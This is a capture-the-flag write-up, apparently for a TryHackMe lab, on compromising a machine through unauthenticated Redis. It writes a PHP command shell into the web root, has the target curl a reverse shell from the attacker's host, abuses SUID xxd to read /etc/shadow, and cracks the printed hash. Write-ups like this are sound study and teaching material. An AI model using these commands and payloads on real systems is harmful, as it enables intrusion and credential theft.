# Res

Basic Recon:
```sh
nmap -sV $ip -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 08:43 CEST
Nmap scan report for 10.10.57.136
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.22 seconds
```

Question: 
Scan the machine, how many ports are open? <br/>
Answer:
`2` Ports are open.

Question:
What's is the database management system installed on the server? <br/>
Answer:
The database management system running on Port 6379 is `redis`.

Question:
What port is the database management system running on? <br/>
Answer:
The Port Redis is running on is `6379`.

Question:
What's is the version of management system installed on the server? <br/>
Answer:
The version of Redis is `6.0.7`.

Afterwards I tried to search for metasploit modules:
```sh
msf6 > search redis

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                       ---------------  ----       -----  -----------
   0   exploit/multi/http/gitlab_github_import_rce_cve_2022_2992  2022-10-06       excellent  Yes    GitLab GitHub Repo Import Deserialization RCE
   1   auxiliary/gather/ibm_bigfix_sites_packages_enum            2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum
   2   exploit/windows/browser/ie_createobject                    2006-04-11       excellent  No     MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution
   3   auxiliary/scanner/redis/redis_server                                        normal     No     Redis Command Execute Scanner
   4   auxiliary/gather/redis_extractor                                            normal     Yes    Redis Extractor
   5   auxiliary/scanner/redis/file_upload                        2015-11-11       normal     No     Redis File Upload
   6   auxiliary/scanner/redis/redis_login                                         normal     No     Redis Login Utility
   7   exploit/linux/redis/redis_debian_sandbox_escape            2022-02-18       excellent  Yes    Redis Lua Sandbox Escape
   8   exploit/linux/redis/redis_replication_cmd_exec             2018-11-13       good       Yes    Redis Replication Code Execution
   9   post/windows/gather/credentials/redis_desktop_manager                       normal     No     RedisDesktopManager credential gatherer
   10  post/windows/gather/credentials/solarwinds_orion_dump      2022-11-08       manual     No     SolarWinds Orion Secrets Dump
   11  exploit/linux/http/sophos_utm_webadmin_sid_cmd_injection   2020-09-18       excellent  Yes    Sophos UTM WebAdmin SID Command Injection
   12  exploit/windows/browser/webex_ucf_newobject                2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow
   13  exploit/windows/browser/ms07_017_ani_loadimage_chunksize   2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)
   14  exploit/windows/email/ms07_017_ani_loadimage_chunksize     2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)
```

I tried some of them but didn't get far. <br/>
When I just tried connecting to the service it seems like unauthorized access is enabled.
```sh
redis-cli -h $ip
10.10.57.136:6379> ls
10.10.57.136:6379> SELECT 1
OK
10.10.57.136:6379[1]> INFO
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:596
run_id:b9b2002212069d6519b946f4e231696946ca05d5
tcp_port:6379
uptime_in_seconds:2324
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:2423612
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:588008
used_memory_human:574.23K
used_memory_rss:4902912
used_memory_rss_human:4.68M
used_memory_peak:644600
used_memory_peak_human:629.49K
used_memory_peak_perc:91.22%
used_memory_overhead:541522
used_memory_startup:524536
used_memory_dataset:46486
used_memory_dataset_perc:73.24%
allocator_allocated:824320
allocator_active:1142784
allocator_resident:3379200
total_system_memory:1038393344
total_system_memory_human:990.29M
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.39
allocator_frag_bytes:318464
allocator_rss_ratio:2.96
allocator_rss_bytes:2236416
rss_overhead_ratio:1.45
rss_overhead_bytes:1523712
mem_fragmentation_ratio:8.99
mem_fragmentation_bytes:4357408
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16986
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1696920104
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:4
total_commands_processed:7
instantaneous_ops_per_sec:0
total_net_input_bytes:181
total_net_output_bytes:26186
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:49
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:13
total_writes_processed:9
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:70add7391aaa3526a832768d9c1f02b0b1594bf2
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.172000
used_cpu_user:3.132000
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
```

After some research on Redis commands I was able to find `CONFIG GET *`. <br/>
This command basically outputs the whole configuration of the database management system. <br/>
What is interesting for us though is that redis is operating in the root direcotry.
```sh
251) "dir"
252) "/"
```

After some more research I found that we can change the working direcotry and create files, so let's try that:
```sh
10.10.57.136:6379[1]> config set dir /var/www/html
OK
10.10.57.136:6379[1]> config set dbfilename test.php
OK
10.10.57.136:6379[1]> set test "<?php phpinfo((; ?>"
OK
10.10.57.136:6379[1]> save
OK
```

After taking a look at the website I was able to find the page with phpinfo() loaded:
![grafik](https://github.com/Aryt3/writeups/assets/110562298/e69b5d1c-f9a8-48a2-9d11-212851c4e5be)

This basically tells me that I can upload a reverse shell.

The easiest way to get a reverse shell to the target machine in my opnion is to start up a http server and make the target machine curl the php script.

```sh
python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.57.136 - - [10/Oct/2023 09:43:53] "GET /rev_shell.php HTTP/1.1" 200 -
```

After starting up I changed the test.php script so that  Icoudl execute commands:
```sh
10.10.57.136:6379[1]> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.57.136:6379[1]> save
OK
```

After this I used the following url to download the `rev_shell.php`.
```sh
http://10.10.57.136/test.php?cmd=curl 10.18.20.25/rev_shell.php > rev_shell.php
```

And after starting up the Netcat listener and navigating to `10.10.57.136/rev_shell.php` I got this:
```sh
nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.18.20.25] from (UNKNOWN) [10.10.57.136] 39170
Linux ubuntu 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:44:30 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ export TERM=xterm
www-data@ubuntu:/$ whoami
www-data
```

Getting the first user flag:
```sh
www-data@ubuntu:/$ ls /home/
vianka
www-data@ubuntu:/$ ls /home/vianka/
redis-stable  user.txt
www-data@ubuntu:/$ cat /home/vianka/user.txt
thm{REDACTED}
```

After using linpeas for further enumeration I found that we got elevated permissions on a binary:
```sh
www-data@ubuntu:/$ ls -la /usr/bin/xxd
-rwsr-xr-x 1 root root 18552 Mar 18  2020 /usr/bin/xxd
```

Using GTFOBins I was able to find a simple command to abuse the binary to view `/etc/shadow/`.
```sh
www-data@ubuntu:/$ LFILE=/etc/shadow
www-data@ubuntu:/$ xxd "$LFILE" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```

Here we found the password hash of the user `vianka`.

Bruteforcing the Hash:
```sh
$ echo 'vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::' > hash
$ john hash --wordlist=../../Desktop/rockyou.txt             
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beautiful1       (vianka)     
1g 0:00:00:00 DONE (2023-10-10 10:01) 6.666g/s 10240p/s 10240c/s 10240C/s kucing..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Logging into the user account:
```sh
www-data@ubuntu:/$ su vianka
Password: beautiful1

vianka@ubuntu:/$ sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Now that seems to be too easy. The user may run any command with sudo.
```sh
vianka@ubuntu:/$ sudo su
root@ubuntu:/# whoami
root
root@ubuntu:/# ls /root/
root.txt
root@ubuntu:/# cat /root/*
thm{REDACTED}
```










